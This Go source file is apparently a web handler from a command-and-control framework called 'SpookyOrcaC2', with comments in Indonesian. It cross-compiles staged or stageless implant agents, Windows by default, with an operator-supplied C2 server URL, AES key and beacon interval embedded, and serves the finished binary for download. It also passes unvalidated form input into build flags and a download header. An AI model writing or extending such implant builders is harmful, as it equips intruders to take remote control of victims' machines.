package handlers

import (
	"fmt"
	"net/http"
	"os"
	"os/exec"
)

func BuildAgentHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}

	r.ParseForm()

	buildType := r.FormValue("buildType")
	osTarget := r.FormValue("os")
	arch := r.FormValue("arch")
	serverURL := r.FormValue("serverURL")
	aesKey := r.FormValue("aesKey")
	interval := r.FormValue("interval")

	if osTarget == "" {
		osTarget = "windows"
	}
	if arch == "" {
		arch = "amd64"
	}
	if serverURL == "" {
		serverURL = "http://127.0.0.1:8080"
	}
	if aesKey == "" {
		aesKey = "SpookyOrcaC2AES1"
	}
	if interval == "" {
		interval = "5"
	}
	if buildType == "" {
		buildType = "stageless"
	}

	outputName := "agent"
	if osTarget == "windows" {
		outputName += ".exe"
	}

	if buildType == "stageless" {
		//
		// === STAGELESS ===
		//
		// 1) Susun argumen build agent_stageless dengan ldflags
		//
		ldFlags := fmt.Sprintf("-X main.defaultServerURL=%s -X main.defaultKey=%s -X main.defaultInterval=%s",
			serverURL, aesKey, interval,
		)
		cmdArgs := []string{
			"build",
			"-o", outputName,
			"-ldflags", ldFlags,
			"./agent_stageless", // Sesuaikan path
		}

		cmd := exec.Command("go", cmdArgs...)
		cmd.Env = append(os.Environ(),
			"GOOS="+osTarget,
			"GOARCH="+arch,
		)
		output, err := cmd.CombinedOutput()
		if err != nil {
			msg := fmt.Sprintf("Failed to build stageless agent:\n%s\nError: %v", output, err)
			http.Error(w, msg, http.StatusInternalServerError)
			return
		}

	} else {
		//
		// === STAGED ===
		//
		// 1) Build stage.go -> stage.bin
		//
		stageOutputName := "stage.bin"
		stageArgs := []string{"build", "-o", stageOutputName, "./agent_staged/stage/stage.go"}
		stageCmd := exec.Command("go", stageArgs...)
		stageCmd.Env = append(os.Environ(),
			"GOOS="+osTarget,
			"GOARCH="+arch,
		)
		stageOut, errStage := stageCmd.CombinedOutput()
		if errStage != nil {
			msg := fmt.Sprintf("Failed to build stage:\n%s\nError: %v", stageOut, errStage)
			http.Error(w, msg, http.StatusInternalServerError)
			return
		}

		//
		// 2) Build stager.go -> stager.exe (atau stager.bin)
		//
		stagerArgs := []string{"build", "-o", outputName, "./agent_staged/stager/stager.go"}
		stagerCmd := exec.Command("go", stagerArgs...)
		stagerCmd.Env = append(os.Environ(),
			"GOOS="+osTarget,
			"GOARCH="+arch,
		)
		stagerOut, errStager := stagerCmd.CombinedOutput()
		if errStager != nil {
			msg := fmt.Sprintf("Failed to build stager:\n%s\nError: %v", stagerOut, errStager)
			http.Error(w, msg, http.StatusInternalServerError)
			return
		}
	}

	// === Sukses build ===
	w.Header().Set("Content-Disposition", "attachment; filename="+outputName)
	http.ServeFile(w, r, outputName)
}
